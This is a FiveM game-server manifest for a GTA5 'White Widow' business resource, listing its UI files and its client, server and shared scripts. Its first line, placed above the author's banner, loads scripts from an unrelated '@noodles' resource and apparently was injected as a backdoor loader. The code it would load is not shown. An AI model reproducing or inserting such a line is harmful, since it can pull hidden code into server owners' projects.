

shared_scripts { '@noodles/fini_events.js', '@noodles/fini_events.lua' }

----------------------------------
--<!>-- BOII | DEVELOPMENT --<!>--
----------------------------------

fx_version 'adamant'

game 'gta5'

author 'case#1993'

description 'BOII | Development - Businesses; White Widow'

version '1.4.2'

lua54 'yes'

ui_page 'html/index.html'

files {
    'html/index.html',
    'html/index.js',
    'html/index.css',
    'html/reset.css',
    'html/images/**/*',
}
shared_scripts {
    '@ox_lib/init.lua',
    'shared/*',
    'language.lua'
}
client_scripts{
    'client/**/*'
}
server_scripts{
    'server/*'
}
escrow_ignore{
    'client/whitewidow_c.lua',
    'client/menus/*',
    'server/whitewidow_s.lua',
    'shared/*',
    'stream/*'
}
dependency '/assetpacks'